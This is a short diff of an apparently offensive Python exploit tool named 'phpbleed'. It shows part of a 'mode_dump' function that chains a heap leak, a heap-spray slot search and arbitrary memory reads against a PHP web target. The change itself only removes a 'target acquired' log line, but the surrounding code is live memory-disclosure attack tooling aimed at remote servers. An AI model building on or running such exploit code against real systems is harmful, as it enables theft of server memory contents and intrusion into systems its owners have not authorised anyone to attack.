@@ -428,7 +428,6 @@ def mode_dump(t: Target, args):
     """Bleed: fresh leak -> locate spray slot S -> self-anchored stream."""
     import phpbleed_chain as chain
     chain.isstring_read = lambda addr, timeout=5: read_at(t, addr, timeout)
-    log(">", f"target acquired :: http://{t.host}:{t.port}{t.path}")
     hr = heap_leak(t)
     if not hr:
         log("x", "heap leak failed (gadget missing or shaping mismatch)")
